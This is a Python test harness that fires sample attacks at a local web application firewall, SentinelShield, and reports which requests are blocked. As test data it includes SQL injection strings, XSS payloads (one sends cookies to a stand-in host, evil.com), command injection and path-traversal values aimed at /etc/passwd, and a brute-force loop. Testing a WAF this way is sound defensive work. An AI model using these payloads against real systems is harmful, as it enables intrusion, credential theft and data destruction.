"""
simulator.py – Automated Attack Simulator
==========================================
This script fires a series of real-world attack payloads at the
SentinelShield WAF so you can see the detection system in action.

It sends:
  ✓ Normal clean requests (should be ALLOWED)
  ✗ SQL Injection attacks (should be BLOCKED)
  ✗ XSS attacks (should be BLOCKED)
  ✗ Command Injection (should be BLOCKED)
  ✗ LFI / Directory Traversal (should be BLOCKED)
  ✗ Brute-force simulation (should trigger RATE LIMIT)
  ✗ Scanner simulation (should be BLOCKED)

HOW TO RUN:
    Make sure app.py is running first, then:
    python simulator.py

Results are printed to the terminal and all events appear in the dashboard.
"""

import requests
import time
import json

BASE_URL = "http://localhost:5000"

# Terminal color codes for pretty output
GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
BLUE   = "\033[94m"
CYAN   = "\033[96m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

# ─────────────────────────────────────────────────────────────────────────────
# TEST CASES
# Each dict has:
#   category    : Attack type label
#   description : What this test does
#   method      : GET or POST
#   endpoint    : Which route to hit
#   params      : URL query parameters (for GET)
#   data        : POST body data
#   expected    : "BLOCKED" or "ALLOWED"
# ─────────────────────────────────────────────────────────────────────────────

TEST_CASES = [

    # ── NORMAL REQUESTS (should be ALLOWED) ─────────────────────────────────
    {
        "category":    "Normal",
        "description": "Clean GET request",
        "method":      "GET",
        "endpoint":    "/test",
        "params":      {},
        "data":        {},
        "expected":    "ALLOWED"
    },
    {
        "category":    "Normal",
        "description": "Clean login attempt",
        "method":      "POST",
        "endpoint":    "/login",
        "params":      {},
        "data":        {"username": "alice", "password": "mypassword123"},
        "expected":    "ALLOWED"
    },
    {
        "category":    "Normal",
        "description": "Clean search query",
        "method":      "GET",
        "endpoint":    "/search",
        "params":      {"q": "cybersecurity tutorials"},
        "data":        {},
        "expected":    "ALLOWED"
    },

    # ── SQL INJECTION ATTACKS ────────────────────────────────────────────────
    {
        "category":    "SQL Injection",
        "description": "Classic OR 1=1 bypass",
        "method":      "POST",
        "endpoint":    "/login",
        "params":      {},
        "data":        {"username": "admin' OR '1'='1", "password": "anything"},
        "expected":    "BLOCKED"
    },
    {
        "category":    "SQL Injection",
        "description": "UNION SELECT data extraction",
        "method":      "GET",
        "endpoint":    "/search",
        "params":      {"q": "1 UNION SELECT username,password FROM users--"},
        "data":        {},
        "expected":    "BLOCKED"
    },
    {
        "category":    "SQL Injection",
        "description": "DROP TABLE destructive attack",
        "method":      "POST",
        "endpoint":    "/test",
        "params":      {},
        "data":        {"input": "'; DROP TABLE users; --"},
        "expected":    "BLOCKED"
    },
    {
        "category":    "SQL Injection",
        "description": "Time-based blind SQLi",
        "method":      "GET",
        "endpoint":    "/search",
        "params":      {"q": "1' AND SLEEP(5)--"},
        "data":        {},
        "expected":    "BLOCKED"
    },

    # ── CROSS-SITE SCRIPTING (XSS) ───────────────────────────────────────────
    {
        "category":    "XSS",
        "description": "Basic script tag injection",
        "method":      "GET",
        "endpoint":    "/search",
        "params":      {"q": "<script>alert('XSS')</script>"},
        "data":        {},
        "expected":    "BLOCKED"
    },
    {
        "category":    "XSS",
        "description": "Image onerror event handler",
        "method":      "POST",
        "endpoint":    "/test",
        "params":      {},
        "data":        {"comment": "<img src=x onerror=alert(document.cookie)>"},
        "expected":    "BLOCKED"
    },
    {
        "category":    "XSS",
        "description": "JavaScript URI scheme",
        "method":      "GET",
        "endpoint":    "/test",
        "params":      {"redirect": "javascript:alert(1)"},
        "data":        {},
        "expected":    "BLOCKED"
    },
    {
        "category":    "XSS",
        "description": "DOM-based cookie theft",
        "method":      "POST",
        "endpoint":    "/test",
        "params":      {},
        "data":        {"input": "<script>document.location='http://evil.com?c='+document.cookie</script>"},
        "expected":    "BLOCKED"
    },

    # ── COMMAND INJECTION ────────────────────────────────────────────────────
    {
        "category":    "Command Injection",
        "description": "Semicolon command separator",
        "method":      "GET",
        "endpoint":    "/test",
        "params":      {"host": "127.0.0.1; cat /etc/passwd"},
        "data":        {},
        "expected":    "BLOCKED"
    },
    {
        "category":    "Command Injection",
        "description": "Pipe to whoami",
        "method":      "POST",
        "endpoint":    "/test",
        "params":      {},
        "data":        {"cmd": "ping | whoami"},
        "expected":    "BLOCKED"
    },
    {
        "category":    "Command Injection",
        "description": "Backtick shell execution",
        "method":      "GET",
        "endpoint":    "/search",
        "params":      {"q": "`id`"},
        "data":        {},
        "expected":    "BLOCKED"
    },

    # ── LOCAL FILE INCLUSION (LFI) ───────────────────────────────────────────
    {
        "category":    "LFI / Path Traversal",
        "description": "Directory traversal to /etc/passwd",
        "method":      "GET",
        "endpoint":    "/test",
        "params":      {"file": "../../../../etc/passwd"},
        "data":        {},
        "expected":    "BLOCKED"
    },
    {
        "category":    "LFI / Path Traversal",
        "description": "PHP wrapper LFI",
        "method":      "GET",
        "endpoint":    "/test",
        "params":      {"page": "php://filter/convert.base64-encode/resource=index.php"},
        "data":        {},
        "expected":    "BLOCKED"
    },
    {
        "category":    "LFI / Path Traversal",
        "description": "URL-encoded traversal",
        "method":      "GET",
        "endpoint":    "/test",
        "params":      {"path": "%2e%2e%2f%2e%2e%2fetc%2fpasswd"},
        "data":        {},
        "expected":    "BLOCKED"
    },

    # ── SCANNER SIMULATION ───────────────────────────────────────────────────
    {
        "category":    "Scanner Detection",
        "description": "SQLMap scanner user-agent",
        "method":      "GET",
        "endpoint":    "/test",
        "params":      {},
        "data":        {},
        "headers":     {"User-Agent": "sqlmap/1.7.8 (https://sqlmap.org)"},
        "expected":    "BLOCKED"
    },
    {
        "category":    "Scanner Detection",
        "description": "Nikto web scanner",
        "method":      "GET",
        "endpoint":    "/test",
        "params":      {},
        "data":        {},
        "headers":     {"User-Agent": "Nikto/2.1.6"},
        "expected":    "BLOCKED"
    },

]

# ─────────────────────────────────────────────────────────────────────────────
# BRUTE FORCE SIMULATION (separate because it's high-volume)
# ─────────────────────────────────────────────────────────────────────────────

BRUTE_FORCE_TEST = {
    "category":    "Brute Force",
    "description": "Rapid repeated login attempts (rate limit trigger)",
    "method":      "POST",
    "endpoint":    "/login",
    "count":       20,          # Send 20 requests rapidly
    "data_template": lambda i: {"username": "admin", "password": f"password{i}"},
}


# ─────────────────────────────────────────────────────────────────────────────
# RUNNER FUNCTIONS
# ─────────────────────────────────────────────────────────────────────────────

def run_single_test(test: dict, index: int) -> dict:
    """Fire a single test request and return the result."""
    url     = BASE_URL + test["endpoint"]
    method  = test["method"].upper()
    headers = test.get("headers", {})

    try:
        if method == "GET":
            resp = requests.get(url, params=test.get("params", {}),
                                headers=headers, timeout=5)
        else:
            resp = requests.post(url, data=test.get("data", {}),
                                 params=test.get("params", {}),
                                 headers=headers, timeout=5)

        # Determine outcome
        if resp.status_code in (403, 429):
            actual = "BLOCKED"
        else:
            actual = "ALLOWED"

        expected = test["expected"]
        correct  = actual == expected

        # Print result
        status_icon = f"{GREEN}✓ PASS{RESET}" if correct else f"{RED}✗ FAIL{RESET}"
        blocked_icon = f"{RED}BLOCKED{RESET}" if actual == "BLOCKED" else f"{GREEN}ALLOWED{RESET}"

        print(f"  [{index:02d}] {status_icon}  "
              f"{CYAN}{test['category']:25}{RESET} "
              f"{test['description'][:45]:45}  "
              f"→ {blocked_icon} (HTTP {resp.status_code})")

        return {
            "test": test["description"],
            "category": test["category"],
            "expected": expected,
            "actual": actual,
            "http_code": resp.status_code,
            "correct": correct
        }

    except requests.exceptions.ConnectionError:
        print(f"  [{index:02d}] {RED}ERROR{RESET}  Cannot connect to {BASE_URL}")
        print(f"         Make sure app.py is running first!")
        return {"correct": False, "error": "connection_refused"}
    except Exception as e:
        print(f"  [{index:02d}] {RED}ERROR{RESET}  {e}")
        return {"correct": False, "error": str(e)}


def run_brute_force_test():
    """Rapidly send multiple requests to trigger rate limiting."""
    print(f"\n  {YELLOW}[BRUTE FORCE SIMULATION]{RESET} "
          f"Sending {BRUTE_FORCE_TEST['count']} rapid requests to /login...")

    url       = BASE_URL + BRUTE_FORCE_TEST["endpoint"]
    blocked_count = 0
    allowed_count = 0

    for i in range(BRUTE_FORCE_TEST["count"]):
        data = BRUTE_FORCE_TEST["data_template"](i)
        try:
            resp = requests.post(url, data=data, timeout=3)
            if resp.status_code == 429:
                blocked_count += 1
            else:
                allowed_count += 1
        except Exception:
            pass
        time.sleep(0.05)  # 50ms between requests — still fast

    print(f"  Result: {GREEN}{allowed_count} allowed{RESET} → "
          f"{RED}{blocked_count} rate-limited{RESET}")
    print(f"  {'✓' if blocked_count > 0 else '✗'} Rate limiter "
          f"{'triggered successfully' if blocked_count > 0 else 'NOT triggered'}")

    return {"allowed": allowed_count, "rate_limited": blocked_count}


def print_summary(results: list, brute_result: dict):
    """Print a final summary table."""
    total   = len(results)
    correct = sum(1 for r in results if r.get("correct"))
    wrong   = total - correct

    print(f"\n{'═'*70}")
    print(f"{BOLD}  SIMULATION COMPLETE — SUMMARY{RESET}")
    print(f"{'═'*70}")
    print(f"  Total tests run    : {total}")
    print(f"  {GREEN}Correct detections : {correct}{RESET}")
    print(f"  {RED}Missed / Wrong     : {wrong}{RESET}")
    print(f"  Accuracy           : {round(correct/total*100, 1)}%")
    print(f"\n  Brute-force test   : {brute_result.get('rate_limited', 0)} requests rate-limited")
    print(f"\n  {CYAN}View full results on the dashboard:{RESET}")
    print(f"  → {BOLD}http://localhost:5000/{RESET}")
    print(f"{'═'*70}\n")


# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print(f"\n{'═'*70}")
    print(f"{BOLD}  SentinelShield – Attack Simulator{RESET}")
    print(f"  Target: {BASE_URL}")
    print(f"{'═'*70}\n")

    # Check server is reachable
    try:
        requests.get(BASE_URL + "/api/stats", timeout=3)
    except requests.exceptions.ConnectionError:
        print(f"{RED}ERROR: Cannot reach {BASE_URL}{RESET}")
        print("Please start the WAF server first:")
        print("  python app.py\n")
        exit(1)

    # Clear old logs for a fresh run
    try:
        requests.post(BASE_URL + "/api/clear", timeout=3)
        print(f"  {YELLOW}[INFO] Old logs cleared — fresh test run{RESET}\n")
    except Exception:
        pass

    # ── Run all attack tests ──────────────────────────────────────────────
    results = []
    print(f"  {'#':4} {'STATUS':8}  {'CATEGORY':25} {'DESCRIPTION':45}  RESULT")
    print(f"  {'─'*4} {'─'*8}  {'─'*25} {'─'*45}  {'─'*12}")

    for i, test in enumerate(TEST_CASES, start=1):
        result = run_single_test(test, i)
        results.append(result)
        time.sleep(0.3)  # Small delay between requests

    # ── Brute force test ──────────────────────────────────────────────────
    brute_result = run_brute_force_test()

    # ── Print summary ─────────────────────────────────────────────────────
    print_summary(results, brute_result)
